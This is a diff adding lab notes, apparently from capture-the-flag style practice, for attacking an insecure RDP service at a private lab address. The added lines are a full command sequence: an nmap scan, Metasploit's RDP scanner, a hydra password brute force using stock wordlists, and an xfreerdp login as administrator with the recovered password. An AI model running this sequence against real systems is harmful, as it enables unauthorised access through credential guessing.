@@ -503,7 +503,15 @@ type flag.txt
 29)  Windows: Insecure RDP Service
 
 ```
-
+cat /root/Desktop/target
+nmap 10.0.0.31
+msfconsole
+use auxiliary/scanner/rdp/rdp_scanner
+set RHOSTS 10.0.0.31
+set RPORT 3333
+exploit
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.0.0.31 -s 3333
+xfreerdp /u:administrator /p:qwertyuiop /v:10.0.0.31:3333
 ```
 
 
